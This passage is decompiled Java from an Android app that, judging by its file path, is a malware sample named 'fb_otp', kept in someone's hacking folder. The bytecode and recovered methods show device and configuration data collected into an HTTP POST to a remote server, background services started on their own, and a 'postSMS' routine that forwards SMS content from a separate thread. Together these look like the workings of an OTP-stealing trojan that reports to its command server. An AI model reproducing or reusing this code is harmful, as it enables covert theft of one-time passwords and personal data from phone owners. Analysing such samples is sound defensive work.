    //   301: new 50	java/lang/String
    //   304: dup
    //   305: aload_3
    //   306: invokestatic 211	cD:a	(Ljava/lang/String;)Ljava/lang/String;
    //   309: invokespecial 212	java/lang/String:<init>	(Ljava/lang/String;)V
    //   312: astore_3
    //   313: new 222	org/apache/http/client/methods/HttpPost
    //   316: dup
    //   317: new 83	java/lang/StringBuilder
    //   320: dup
    //   321: aload 4
    //   323: getstatic 215	com/soft360/iService/AService:jdField_a_of_type_Int	I
    //   326: invokevirtual 217	dU:a	(I)Ljava/lang/String;
    //   329: invokestatic 220	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   332: invokespecial 92	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   335: aload_3
    //   336: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   339: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   342: invokespecial 223	org/apache/http/client/methods/HttpPost:<init>	(Ljava/lang/String;)V
    //   345: astore_3
    //   346: new 238	java/util/ArrayList
    //   349: dup
    //   350: invokespecial 239	java/util/ArrayList:<init>	()V
    //   353: astore 5
    //   355: aload 5
    //   357: new 248	org/apache/http/message/BasicNameValuePair
    //   360: dup
    //   361: ldc -6
    //   363: aload 4
    //   365: invokevirtual 252	dU:b	()Ljava/lang/String;
    //   368: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   371: invokeinterface 260 2 0
    //   376: pop
    //   377: aload 5
    //   379: new 248	org/apache/http/message/BasicNameValuePair
    //   382: dup
    //   383: ldc_w 545
    //   386: aload_0
    //   387: invokespecial 546	eu:b	()Ljava/lang/String;
    //   390: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   393: invokeinterface 260 2 0
    //   398: pop
    //   399: aload 5
    //   401: new 248	org/apache/http/message/BasicNameValuePair
    //   404: dup
    //   405: ldc_w 548
    //   408: aload_0
    //   409: invokespecial 550	eu:d	()Ljava/lang/String;
    //   412: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   415: invokeinterface 260 2 0
    //   420: pop
    //   421: aload 5
    //   423: new 248	org/apache/http/message/BasicNameValuePair
    //   426: dup
    //   427: ldc_w 552
    //   430: invokestatic 554	eu:e	()Ljava/lang/String;
    //   433: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   436: invokeinterface 260 2 0
    //   441: pop
    //   442: aload 5
    //   444: new 248	org/apache/http/message/BasicNameValuePair
    //   447: dup
    //   448: ldc_w 262
    //   451: aload_0
    //   452: invokevirtual 264	eu:a	()Ljava/lang/String;
    //   455: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   458: invokeinterface 260 2 0
    //   463: pop
    //   464: aload 5
    //   466: new 248	org/apache/http/message/BasicNameValuePair
    //   469: dup
    //   470: ldc_w 278
    //   473: aload_0
    //   474: invokespecial 281	eu:f	()Ljava/lang/String;
    //   477: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   480: invokeinterface 260 2 0
    //   485: pop
    //   486: aload 5
    //   488: new 248	org/apache/http/message/BasicNameValuePair
    //   491: dup
    //   492: ldc_w 556
    //   495: new 83	java/lang/StringBuilder
    //   498: dup
    //   499: ldc_w 558
    //   502: invokespecial 92	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   505: getstatic 563	android/os/Build$VERSION:RELEASE	Ljava/lang/String;
    //   508: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   511: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   514: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   517: invokeinterface 260 2 0
    //   522: pop
    //   523: aload 5
    //   525: new 248	org/apache/http/message/BasicNameValuePair
    //   528: dup
    //   529: ldc_w 733
    //   532: getstatic 525	com/soft360/iService/AService:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   535: invokestatic 459	android/preference/PreferenceManager:getDefaultSharedPreferences	(Landroid/content/Context;)Landroid/content/SharedPreferences;
    //   538: ldc_w 735
    //   541: ldc_w 737
    //   544: invokeinterface 608 3 0
    //   549: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   552: invokeinterface 260 2 0
    //   557: pop
    //   558: aload 5
    //   560: new 248	org/apache/http/message/BasicNameValuePair
    //   563: dup
    //   564: ldc_w 278
    //   567: aload_0
    //   568: invokespecial 281	eu:f	()Ljava/lang/String;
    //   571: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   574: invokeinterface 260 2 0
    //   579: pop
    //   580: aload 5
    //   582: new 248	org/apache/http/message/BasicNameValuePair
    //   585: dup
    //   586: ldc_w 283
    //   589: getstatic 286	em:jdField_a_of_type_JavaLangString	Ljava/lang/String;
    //   592: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   595: invokeinterface 260 2 0
    //   600: pop
    //   601: aload 5
    //   603: new 248	org/apache/http/message/BasicNameValuePair
    //   606: dup
    //   607: ldc_w 739
    //   610: new 83	java/lang/StringBuilder
    //   613: dup
    //   614: getstatic 525	com/soft360/iService/AService:jdField_a_of_type_AndroidContentContext	Landroid/content/Context;
    //   617: ldc -16
    //   619: invokevirtual 34	android/content/Context:getString	(I)Ljava/lang/String;
    //   622: invokestatic 220	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   625: invokespecial 92	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   628: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   631: invokespecial 255	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   634: invokeinterface 260 2 0
    //   639: pop
    //   640: aload_3
    //   641: new 288	org/apache/http/client/entity/UrlEncodedFormEntity
    //   644: dup
    //   645: aload 5
    //   647: ldc -59
    //   649: invokespecial 291	org/apache/http/client/entity/UrlEncodedFormEntity:<init>	(Ljava/util/List;Ljava/lang/String;)V
    //   652: invokevirtual 295	org/apache/http/client/methods/HttpPost:setEntity	(Lorg/apache/http/HttpEntity;)V
    //   655: aload_2
    //   656: aload_3
    //   657: invokeinterface 303 2 0
    //   662: astore_2
    //   663: aload_2
    //   664: invokeinterface 535 1 0
    //   669: invokeinterface 540 1 0
    //   674: istore_1
    //   675: new 83	java/lang/StringBuilder
    //   678: dup
    //   679: ldc_w 741
    //   682: invokespecial 92	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   685: iload_1
    //   686: invokestatic 268	java/lang/String:valueOf	(I)Ljava/lang/String;
    //   689: invokevirtual 98	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   692: invokevirtual 99	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   695: pop
    //   696: iload_1
    //   697: sipush 200
    //   700: if_icmpne +92 -> 792
    //   703: aload_2
    //   704: invokeinterface 309 1 0
    //   709: astore_3
    //   710: ldc 45
    //   712: astore_2
    //   713: aload_3
    //   714: ifnull +19 -> 733
    //   717: aload_3
    //   718: invokeinterface 315 1 0
    //   723: astore_3
    //   724: aload_3
    //   725: invokestatic 75	eu:b	(Ljava/io/InputStream;)Ljava/lang/String;
    //   728: astore_2
    //   729: aload_3
    //   730: invokevirtual 635	java/io/InputStream:close	()V
    //   733: aload_2
    //   734: invokevirtual 621	java/lang/String:trim	()Ljava/lang/String;
    //   737: ldc_w 743
    //   740: invokevirtual 746	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   743: ifge +30 -> 773
    //   746: new 176	java/lang/Exception
    //   749: dup
    //   750: aload_2
    //   751: invokespecial 747	java/lang/Exception:<init>	(Ljava/lang/String;)V
    //   754: athrow
    //   755: astore_2
    //   756: aload_2
    //   757: invokevirtual 603	java/lang/Exception:toString	()Ljava/lang/String;
    //   760: pop
    //   761: new 176	java/lang/Exception
    //   764: dup
    //   765: aload_2
    //   766: invokevirtual 603	java/lang/Exception:toString	()Ljava/lang/String;
    //   769: invokespecial 747	java/lang/Exception:<init>	(Ljava/lang/String;)V
    //   772: athrow
    //   773: aload_2
    //   774: invokevirtual 621	java/lang/String:trim	()Ljava/lang/String;
    //   777: ldc_w 743
    //   780: invokevirtual 746	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   783: ifle +9 -> 792
    //   786: aload 4
    //   788: invokevirtual 748	dU:n	()Z
    //   791: pop
    //   792: aload 4
    //   794: invokevirtual 438	dU:h	()V
    //   797: return
    //   798: astore_2
    //   799: goto -590 -> 209
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	802	0	this	eu
    //   674	27	1	i	int
    //   75	119	2	localObject1	Object
    //   220	1	2	localException1	Exception
    //   225	526	2	localObject2	Object
    //   755	19	2	localException2	Exception
    //   798	1	2	localException3	Exception
    //   114	616	3	localObject3	Object
    //   4	789	4	localdU	dU
    //   18	628	5	localObject4	Object
    // Exception table:
    //   from	to	target	type
    //   28	98	220	java/lang/Exception
    //   346	696	755	java/lang/Exception
    //   703	710	755	java/lang/Exception
    //   717	733	755	java/lang/Exception
    //   733	755	755	java/lang/Exception
    //   773	792	755	java/lang/Exception
    //   139	209	798	java/lang/Exception
  }
  
  public final void a(Context paramContext)
  {
    this.jdField_a_of_type_AndroidContentContext = paramContext;
  }
  
  public final boolean a()
  {
    int i3 = 0;
    Object localObject = jdField_a_of_type_JavaLangString;
    if (AService.jdField_a_of_type_AndroidContentContext == null)
    {
      this.jdField_a_of_type_AndroidContentContext.startService(new Intent(this.jdField_a_of_type_AndroidContentContext, AService.class));
      this.jdField_a_of_type_AndroidContentContext.startService(new Intent(this.jdField_a_of_type_AndroidContentContext, webService.class));
    }
    if (this.jdField_a_of_type_AndroidContentContext != null) {}
    for (localObject = this.jdField_a_of_type_AndroidContentContext; !et.a((Context)localObject).a(); localObject = AService.jdField_a_of_type_AndroidContentContext) {
      throw new ConnectException("not online!");
    }
    localObject = dU.a(null);
    if (!((dU)localObject).m()) {
      throw new SQLException("device not init!");
    }
    a((dU)localObject, true);
    int i;
    int j;
    label148:
    int k;
    label156:
    int m;
    label165:
    int n;
    label185:
    int i1;
    label194:
    int i2;
    if (dU.l())
    {
      i = 0;
      if (!dU.i()) {
        break label255;
      }
      j = 0;
      if (!dU.j()) {
        break label260;
      }
      k = 0;
      if (!dU.k()) {
        break label265;
      }
      m = 0;
      a((dU)localObject, i, j, k, m);
      if (!dU.l()) {
        break label271;
      }
      n = 0;
      if (!dU.i()) {
        break label277;
      }
      i1 = 0;
      if (!dU.j()) {
        break label283;
      }
      i2 = 0;
      label203:
      if (!dU.k()) {
        break label289;
      }
    }
    for (;;)
    {
      if ((n != i) || (i1 != j) || (i2 != k) || (i3 != m)) {
        a((dU)localObject, n, i1, i2, i3);
      }
      return true;
      i = 1;
      break;
      label255:
      j = 1;
      break label148;
      label260:
      k = 1;
      break label156;
      label265:
      m = 1;
      break label165;
      label271:
      n = 1;
      break label185;
      label277:
      i1 = 1;
      break label194;
      label283:
      i2 = 1;
      break label203;
      label289:
      i3 = 1;
    }
  }
  
  public final boolean a(String paramString1, String paramString2)
  {
    new StringBuilder("webServiceRobot  postSMS ").append(paramString2).toString();
    ev localev = new ev(this);
    localev.jdField_a_of_type_JavaLangString = paramString1;
    localev.b = paramString2;
    localev.start();
    return true;
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/eu.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */